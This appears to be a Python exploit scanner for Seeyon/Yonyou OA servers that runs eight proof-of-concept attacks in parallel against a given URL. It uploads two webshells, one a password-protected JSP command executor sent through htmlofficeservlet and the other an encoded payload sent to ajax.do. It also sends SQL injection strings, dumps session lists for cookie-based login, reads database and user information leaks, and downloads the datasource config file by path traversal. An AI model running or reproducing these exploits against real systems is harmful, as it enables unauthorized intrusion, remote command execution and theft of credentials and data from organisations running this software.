from modules import RequestsClass
from multiprocessing.dummy import Pool
from functools import partial
import re

def poc1(url):
	target = url+"/seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzip"
	header = {
			"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
			"Content-Type": "application/x-www-form-urlencoded",
	}
	data =  "managerMethod=validate&arguments=%1F%C2%8B%08%00%00%00%00%00%00%0AuTK%C2%93%C2%A2H%10%3E%C3%AF%C3%BE%0A%C3%82%C2%8Bv%C3%B4%C2%8C%C2%8D+c%C2%BB%13%7Bh_%C2%88%28%2A%28%C2%AF%C2%8D%3D%40%15Ba%15%C2%B0%C3%B2%10%C3%AC%C2%98%C3%BF%C2%BE%05%C3%98%C3%93%3D%C2%B1%C2%BDu%C2%A9%C3%8C%C2%AC%C3%8C%C2%AF%C3%B2%C3%BD%C3%97k%C3%B7%14_H%C2%8E%C2%9DC%C2%95x%C3%9D%3F%C2%98%C3%81%17%C3%A6M%C2%A28%C2%A4%C2%96t3%2F%C3%8D%C2%BA%C3%AF%C3%A2y%C2%99%5C%C2%BC4EqT%3Fj%C3%99%05E%3E%C2%938Y%C3%80%C3%BC%C3%89t%C3%BA%C3%BD%C2%A7%C2%AB%C3%A7%3AI%C2%92%3E%C2%A5%C2%9EW%C3%85%C3%91S%C3%A7%C3%BB%C3%AFL%7B%7E%0B%C2%9D%C3%82%C3%A9%C2%A3%C2%B8%C2%BF%C2%A3%26%C2%99qA%C2%99wa%C2%92w%C2%9A%C2%A3%00%C2%91we%3EQ%C3%AB%C3%95%C3%B8%C2%8F%C2%9D%C2%9D%C2%87%C3%B6%C2%A8%1F%C2%A6I%C3%99y%C3%B8%09%C3%8B%C3%9C%5DH%03%0F%C3%A3%C3%9A%C2%87%C2%9D%C2%98%C3%9C%C3%80%2C%C2%A9%5Cn%C3%8CJ%C3%8B+sE%C3%A1%C2%B6%25%C2%B5%C2%8CE%C3%8ERe%C3%81%2C.%C3%96%5C%12%402%C3%8F%01%C2%AF%C3%A7k%C2%A2%14%C2%AE6%C2%96%C2%8F%C2%83%C2%97%C3%A2%28.%22%5B%C2%93%7CH%C3%B4%0Ap%C2%B8pC%16m%C2%B4a%25%C2%85%C3%83g%27R%C2%AE%5B%C2%A2%26%C2%80%C3%A8%21%141gk%C3%82%C3%952+%C2%96D%C2%9C%01q%5C%C3%81%1A%C2%9F%2C8K%13%06%C3%B4%3D%5D%C2%A38mx%C3%93%C3%8F-%7E%25%C2%80%C2%A5Z%7C%2A%C2%A3%C2%B8%C2%B6%C2%B1%C3%89e%24%15%C2%BB%C2%B0%C3%BC%07%C3%B0%2F%C3%9FlQ%0F%5DqQY%C2%A6%C2%9A%C2%B8%C3%9C%C3%B0Q%12%C2%95%C3%942%C2%95%C2%9B%C2%B48%C3%BA%C2%B6%19%C2%B0%C2%B6%21%C2%9CA5%C2%99Q%C2%9D%1B%60%C3%8B%C3%822T%0C%C2%A2L%C2%97%C3%A7%C2%AD%C3%9EA%1C%07%14%C2%A3%C2%92%C3%84M%C3%A2%C3%B1%C3%8A%00PZ%C2%A6%C3%B4%C2%96%1F%5C%C2%A1%C2%B1J%1Dc%C3%A3%C3%AF%C2%B92%00%C3%BC%C3%86%C2%B7%C2%AB%00y%C2%A6%C2%8A%C2%A5E%06-%C2%84G4%3E%16%C2%9A%C2%AB%5CZ%C2%B6vk%C2%A2b%C2%9B%C3%A0%C3%9C%3E%C2%B6%C3%98%C2%B2%28%C2%A5%C2%9Bi%C2%89%C3%96%C2%A4%C3%84.%C2%81%C2%AC3%3D%C2%8FN%26%C3%BBLsZ%C3%A7%C3%BDl%1B%C2%B5%C3%9E%2A%C2%A09%C2%A0%C3%B9%C2%BB%C3%A7-RB%40%C3%B0%15%C2%8A%25%C2%863%C3%A1%00%C2%97%C2%AB%C3%84%25%C3%80wn%2C%C2%B2%0F%C3%BB%C2%81%7D%C3%98T%5B%C3%83%C3%86V%C2%A8%C2%9F%C2%B7%07i%60%21i%048%C3%BD%C3%96%C3%94%00%09Wh%C2%AA%C2%86e%C2%94%03%5B%C3%B3%11%C3%94%C2%A4%C3%94%C2%A9%C3%8E%C2%A3%3D%C2%87%C2%AFN%1B%C3%A3%C3%B8%C2%8D%5E%13%C2%88%C3%A1%1C%C3%93%C2%BA%C2%AA%C2%81K%14%2COW%13U%C3%9F+%C3%B9%C2%90%C2%85k%1A%C2%83c%C3%AE%C3%A3%0D%2As%C3%9B%04%C3%BE%C2%91%C3%93%C3%83%3AV%C2%8D%C3%93%C2%85%23%3F%C3%81V%C3%A5%C3%87%1F%C3%BE%C2%8C%C3%AC_%C3%BFL%C3%A4JB%C2%B2%C3%96%C3%88%C2%A7u%C2%BE%40%C3%A5%27%C3%AB7%7C%C3%AD%3Cr%C2%89%C3%8E%C3%93%C3%BA%C3%84P%0C%12P5zm%7Dj%C2%BD%C3%86%C2%AF_k%23O%C3%8FT%0Eb%C2%AB%12%C3%8E.k%C3%93%7C%2CRY%140%C2%AC%267h%0Cs%C3%97%C3%807%C3%BA6%C3%9D%C3%AB%C3%8AB%09%C3%959%C3%8Dkq%C2%B7%C3%8B%C2%9B%C3%BE%C3%A0T%C2%BC%C2%8Ftb%C3%93%5E%C2%95%C2%97%2B%0CL%1D%03%7E%C2%9F%C3%9B%C2%9C%C3%8E%1E%C2%89%C3%BE%C3%B6G%0Ej%C2%9AN%C2%ADK%C2%8E1%C3%B53%C2%A11%C3%90%C3%B8%C3%A1%C3%8A%C2%8D%14%C3%962%C2%84%C2%90%C3%86G%C3%BD%C3%90Kh%2CRP%05MO%C3%AF%C2%B9q%0EE%7D%08imw%C3%93q%C3%93%C2%93%C2%80S%2A%C3%87%C2%9C%C2%B0%C2%AE%C2%A8%C2%B3%C2%BB%C3%B0Z%C2%B4u%5D%15.%C2%BF%7F%7C%C2%9Fr%26%C3%8D%C2%A3%3EA%29%C3%A8O%5E%C2%B4%C3%B9%C2%B7%C3%A1%C3%8C%031%C2%A4%C2%83%0E%C3%AFw%3B%C3%A3%C2%9F%2B%C3%B5%C3%BE%3B%C3%95%C2%AD%C3%99%C2%9Dim%5B%C2%A6w%07%C3%AC%C2%B7%C3%B7%24%3F%C2%9D%28%40%C2%B3%04%1E%C2%BEt%C2%8E%C2%87%C3%85%C3%97%C3%A7%C2%8FK%C3%A2%C3%A3%C2%9E%C3%A97%0C%C2%8Ez%1F%C3%81%C3%BFO%17%C3%A08%C3%B5%C2%A8c%3F%C2%BE%C3%97%7B%C2%90%12%C3%90%3B1i%C3%A6d%080eY%C3%B6%1E%5E%C2%BB%3F%C3%A8r%C2%A4%0B%C3%B2%C2%B5%C2%BE%C2%B3K%C3%AEu%C3%BF%C3%BE%17%1CR%C2%AD%17W%05%00%00"
	r = RequestsClass.Requests(url,target,data,header)
	res1 = r.PostDatarequests()
	if res1 != False:
		if res1[0] == 500 and "\"message\":null," in res1[1]:
			res = str("[+] "+url+"/seeyon/PeiQi.jspx"+"\n"+"密码为:rebeyond")
			return res
		else:
			res = str("[-] "+url+"  不存在ajax.do上传漏洞！")
			return res
	else:
		res = str('[-] '+url+"  ajax.do上传请求失败!")
		return res

def poc2(url):
	target = url+"/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(17) union all select 1,2,@@version,user()%23"
	r = RequestsClass.Requests(url,target)
	res2 = r.Getrequest()
	if res2 != False:
		if "分机号" in res2[1]:
			res = str("[+]"+url+"  setextno.jsp注入漏洞存在！")
			return res
		else:
			res = str("[-] "+url+"  不存在setextno.jsp注入漏洞！")
			return res
	else:
		res = str('[-] '+url+"  setextno.jsp注入请求错误！")
		return res

def poc3(url):
	target = url+"/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT database())"
	r = RequestsClass.Requests(url,target)
	res3 = r.Getrequest()
	if res3 != False:
		if res3[0] == 200 and "序号" in res3[1]:
			res = str("[+] "+url+"  致远test.jsp注入漏洞存在！"+"\n"+"exp: /yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT database())")
			return res
		else:
			res = str("[-] "+url+"  不存在致远test.jsp注入漏洞！")
			return res
	else:
		res = str('[-] '+url+"  致远test.jsp注入请求有误！")
		return res

def poc4(url):
	target = url+"/yyoa/ext/https/getSessionList.jsp?cmd=getAll"
	r = RequestsClass.Requests(url,target)
	res4 = r.Getrequest()
	if res4 != False:
		if res4[0] == 200 and "<usrID>" in res4[1]:
			res = str("[+] "+url+"  session登录漏洞存在！"+"\n"+"poc为：/yyoa/ext/https/getSessionList.jsp?cmd=getAll"+"\n"+"可获取cookie登录！")
			return res
		else:
			res = str("[-] "+url+"  不存在session登录漏洞！")
			return res
	else:
		res = str('[-] '+url+"  session登录请求错误！")
		return res

def poc5(url):
	target = url+"/seeyon/htmlofficeservlet"
	headers = {'Content-Type': 'application/x-www-form-urlencoded'}
	data='''
DBSTEP V3.0     355             0               666             DBSTEP=OKMLlKlV
OPTION=S3WYOSWLBSGr
currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66
CREATEDATE=wUghPB3szB3Xwg66
RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6
originalFileId=wV66
originalCreateDate=wUghPB3szB3Xwg66
FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6
needReadFile=yRWZdAS6
originalCreateDate=wLSGP4oEzLKAz4=iz=66
<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+"\n");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();} %><%if("asasd33445".equals(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.println("<pre>"+excuteCmd(request.getParameter("cmd")) + "</pre>");}else{out.println(":-)");}%>6e4f045d4b8506bf492ada7e3390d7ce
	'''
	
	r = RequestsClass.Requests(url,target,data,headers)
	res5 = r.PostDatarequests()
	t1 = url+"/seeyon/test123456.jsp?pwd=asasd3344&cmd=cmd%20+/c+echo+test"
	r1 = RequestsClass.Requests(url,t1)
	newres = r1.Getrequest()
	if newres != False:
		if "test" in newres[1]:
			res = str("[+] "+url+"  远程命令执行漏洞存在！"+"\n"+"exp: /seeyon/test123456.jsp?pwd=asasd3344&cmd=cmd%20+/c+echo+test"+"\n"+"连接密码为:asasd3344")
			return res
		else:
			res = str("[-] "+url+"  不存在远程命令执行漏洞！")
			return res
	else:
		res = str('[-] '+url+"  远程命令执行请求错误！")
		return res

def poc6(url):
	target = url+"/yyoa/createMysql.jsp"
	r = RequestsClass.Requests(url,target)
	res6 = r.Getrequest()
	if res6 != False:
		if res6[0] == 200 and "root" in res6[1]:
			res = str("[+] "+url+"  存在数据库信息泄露！"+"\n"+"exp: /yyoa/createMysql.jsp")
			return res
		else:
			res = str("[-] "+url+"  不存在数据库信息泄露！")
			return res
	else:
		res = str('[-] '+url+"  数据库信息泄露请求有误！")
		return res

def poc7(url):
	target = url+"/yyoa/assess/js/initDataAssess.jsp"
	r = RequestsClass.Requests(url,target)
	res7 = r.Getrequest()
	if res7 != False:
		if res7[0] != 404 :
			res = str("[+] "+url+"  存在initDataAssess.jsp 用户敏感信息泄露！"+"\n"+"exp: /yyoa/assess/js/initDataAssess.jsp")
			return res
		else:
			res = str("[-] "+url+"  不存在initDataAssess.jsp 用户敏感信息泄露！")
			return res
	else:
		res = str('[-] '+url+"  initDataAssess.jsp 用户敏感信息泄露请求错误！")
		return res

def poc8(url):
	target = url+"/seeyon/webmail.do?method=doDownloadAtt&filename=test.txt&filePath=../conf/datasourceCtp.properties"
	r = RequestsClass.Requests(url,target)
	res8 = r.Getrequest()
	if res8 != False:
		if "workflow" in res8[1] :
			res = str("[+] "+url+"  datasourceCtp.properties 配置文件下载存在！"+'\n'+"exp: /seeyon/webmail.do?method=doDownloadAtt&filename=test.txt&filePath=../conf/datasourceCtp.properties")
			return res
		else:
			res = str("[-] "+url+"  不存在datasourceCtp.properties配置文件下载！")
			return res
	else:
		res = str('[-] '+url+"  datasourceCtp.properties配置文件下载请求错误！")
		return res

def runall(name,url):
	if name == 'poc1':
		r1 = poc1(url)
		return r1
	elif name == 'poc2':
		r2 = poc2(url)
		return r2
	elif name == 'poc3':
		r3 = poc3(url)
		return r3
	elif name == 'poc4':
		r4 = poc4(url)
		return r4
	elif name == 'poc5':
		r5 = poc5(url)
		return r5
	elif name == 'poc6':
		r6 = poc6(url)
		return r6
	elif name == 'poc7':
		r7 = poc7(url)
		return r7
	elif name == 'poc8':
		r8 = poc8(url)
		return r8



def run(url):
	list1 = ['poc1','poc2','poc3','poc4','poc5','poc6','poc7','poc8']
	pool = Pool(processes=50)
	func = partial(runall,url=url)
	res = pool.map(func,list1)
	pool.close()
	return res